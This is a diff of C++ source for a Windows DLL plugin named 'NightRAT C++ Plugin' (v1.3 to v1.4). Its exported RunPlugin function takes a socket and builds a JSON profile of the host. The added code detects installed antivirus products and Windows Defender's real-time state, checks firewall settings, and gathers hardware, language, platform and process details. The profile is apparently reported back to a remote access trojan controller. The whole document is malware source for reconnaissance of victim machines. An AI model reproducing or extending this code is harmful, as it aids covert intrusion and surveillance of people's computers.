@@ -3,6 +3,9 @@
 #include <winsock2.h>
 #include <psapi.h>
 #include <iphlpapi.h>
+#include <initguid.h>
+#include <devguid.h>
+#include <setupapi.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,13 +17,14 @@
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
+#pragma comment(lib, "setupapi.lib")
 
 using json = nlohmann::json;
 using namespace std;
 
 // Helper to get registry value
 string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
-    char data[255];
+    char data[512];
     DWORD dataSize = sizeof(data);
     if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
         return string(data);
@@ -41,11 +45,140 @@ string getMacAddress() {
 }
 
 string getUptime() {
-    DWORD ticks = GetTickCount();
-    int seconds = ticks / 1000;
+    ULONGLONG ticks = GetTickCount64();
+    int seconds = (int)(ticks / 1000);
     int minutes = seconds / 60;
     int hours = minutes / 60;
-    return to_string(hours) + "h " + to_string(minutes % 60) + "m";
+    int days = hours / 24;
+
+    string res = "";
+    if (days > 0) res += to_string(days) + "d ";
+    res += to_string(hours % 24) + "h " + to_string(minutes % 60) + "m";
+    return res;
+}
+
+string getGPUName() {
+    DISPLAY_DEVICEA dd;
+    dd.cb = sizeof(dd);
+    if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) {
+        return string(dd.DeviceString);
+    }
+    return getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinSAT", "PrimaryAdapterString");
+}
+
+string getUSBCount() {
+    int count = 0;
+    // Using GUID_DEVCLASS_USB to count USB controllers/hubs or devices
+    HDEVINFO hDevInfo = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
+    if (hDevInfo != INVALID_HANDLE_VALUE) {
+        SP_DEVINFO_DATA devInfoData;
+        devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+        while (SetupDiEnumDeviceInfo(hDevInfo, count, &devInfoData)) {
+            count++;
+        }
+        SetupDiDestroyDeviceInfoList(hDevInfo);
+    }
+    return to_string(count) + " Active USB Controllers/Devices";
+}
+
+string getMachineType() {
+    SYSTEM_POWER_STATUS sps;
+    if (GetSystemPowerStatus(&sps)) {
+        if (sps.BatteryFlag != 128 && sps.BatteryFlag != 255) return "Laptop";
+    }
+    if (GetSystemMetrics(SM_TABLETPC)) return "Tablet/2-in-1";
+    return "Desktop";
+}
+
+string getAntivirus() {
+    string av = "None";
+    // Check for Windows Defender specifically via Registry
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD disable = 0;
+        DWORD size = sizeof(DWORD);
+        if (RegQueryValueExA(hKey, "DisableRealtimeMonitoring", NULL, NULL, (LPBYTE)&disable, &size) == ERROR_SUCCESS) {
+            if (disable == 0) av = "Windows Defender (Active)";
+            else av = "Windows Defender (Disabled)";
+        } else {
+            av = "Windows Defender";
+        }
+        RegCloseKey(hKey);
+    }
+
+    // Fallback or addition: Check common installation paths
+    const char* paths[] = {
+        "C:\\Program Files\\Avast Software\\Avast\\AvastUI.exe",
+        "C:\\Program Files (x86)\\AVG\\Antivirus\\avgui.exe",
+        "C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbam.exe",
+        "C:\\Program Files\\ESET\\ESET Security\\ecmd.exe",
+        "C:\\Program Files\\Kaspersky Lab\\Kaspersky Anti-Virus\\avp.exe"
+    };
+    const char* names[] = { "Avast", "AVG", "Malwarebytes", "ESET", "Kaspersky" };
+
+    for (int i = 0; i < 5; i++) {
+        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES) {
+            if (av == "None" || av == "Windows Defender (Disabled)") av = names[i];
+            else if (av.find(names[i]) == string::npos) av += " / " + string(names[i]);
+        }
+    }
+
+    return av;
+}
+
+string getFirewall() {
+    string fw = "Unknown";
+    HKEY hKey;
+    // Check Domain Profile
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD enable = 0;
+        DWORD size = sizeof(DWORD);
+        if (RegQueryValueExA(hKey, "EnableFirewall", NULL, NULL, (LPBYTE)&enable, &size) == ERROR_SUCCESS) {
+            if (enable) fw = "Windows Firewall (Enabled)";
+            else fw = "Windows Firewall (Disabled)";
+        }
+        RegCloseKey(hKey);
+    }
+    // If unknown or disabled, check Standard Profile
+    if (fw == "Unknown" || fw == "Windows Firewall (Disabled)") {
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD enable = 0;
+            DWORD size = sizeof(DWORD);
+            if (RegQueryValueExA(hKey, "EnableFirewall", NULL, NULL, (LPBYTE)&enable, &size) == ERROR_SUCCESS) {
+                if (enable) fw = "Windows Firewall (Enabled)";
+                else fw = "Windows Firewall (Disabled)";
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    return fw;
+}
+
+string getLanguage() {
+    char lang[256];
+    if (GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGDISPLAYNAME, lang, sizeof(lang))) {
+        return string(lang);
+    }
+    return "Unknown";
+}
+
+string getPlatform() {
+    SYSTEM_INFO si;
+    GetNativeSystemInfo(&si);
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) return "x64 Native";
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) return "x86 Native";
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) return "ARM64 Native";
+    return "Unknown";
+}
+
+string getProcessName() {
+    char path[MAX_PATH];
+    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
+        string fullPath(path);
+        size_t lastSlash = fullPath.find_last_of("\\/");
+        return (lastSlash != string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
+    }
+    return "client.exe";
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -66,9 +199,13 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     if (GetComputerNameA(pcname, &pSize)) j["pcname"] = string(pcname);
     else j["pcname"] = "Unknown";
 
-    j["os"]                 = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
-    j["client"]             = "NightRAT C++ Plugin v1.3";
-    j["process"]            = "client_main.exe";
+    string osName = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
+    string osVer = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion");
+    if (osVer != "N/A" && !osVer.empty()) osName += " (" + osVer + ")";
+    j["os"]                 = osName;
+
+    j["client"]             = "NightRAT C++ Plugin v1.4";
+    j["process"]            = getProcessName();
     j["datetime"]           = string(date_buf);
 
     // Drivers
@@ -86,8 +223,8 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     else
         j["hddserial"] = "N/A";
 
-    j["listusb"]            = "Active USB Controllers Found";
-    j["gpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinSAT", "PrimaryAdapterString");
+    j["listusb"]            = getUSBCount();
+    j["gpu"]                = getGPUName();
     j["cpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
 
     // RAM
@@ -99,20 +236,14 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
         j["ram"] = "N/A";
 
     j["systemproductname"]  = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
-    j["machinetype"]        = "Desktop/Laptop";
+    j["machinetype"]        = getMachineType();
     j["lastreboot"]         = getUptime();
-
-    // Antivirus
-    if (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES)
-        j["antivirus"] = "Windows Defender";
-    else
-        j["antivirus"] = "Other/None";
-
-    j["firewall"]           = "Windows Firewall";
+    j["antivirus"]          = getAntivirus();
+    j["firewall"]           = getFirewall();
     j["macaddress"]         = getMacAddress();
     j["defaultbrowser"]     = getRegValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId");
-    j["currentlang"]        = "Turkish (TR)";
-    j["platform"]           = "x64 Native";
+    j["currentlang"]        = getLanguage();
+    j["platform"]           = getPlatform();
 
     // Battery
     SYSTEM_POWER_STATUS sps;
